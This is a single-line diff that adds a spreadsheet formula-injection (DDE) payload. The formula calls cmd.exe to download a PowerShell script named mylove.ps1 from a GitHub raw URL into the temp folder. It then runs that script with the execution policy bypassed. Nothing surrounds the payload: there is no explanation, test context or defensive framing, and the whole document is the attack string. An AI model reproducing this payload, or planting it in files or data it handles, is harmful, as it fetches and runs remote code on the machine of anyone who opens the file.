@@ -1,0 +1,1 @@
+= msexcel|'\\..\..\..\Windows\System32\cmd.exe /c curl -o %TEMP%\mylove.ps1 https://raw.githubusercontent.com/KONICHIVAA/TESTDRP/refs/heads/master/mylove.ps1 && powershell -ExecutionPolicy Bypass -File %TEMP%\mylove.ps1'!A1
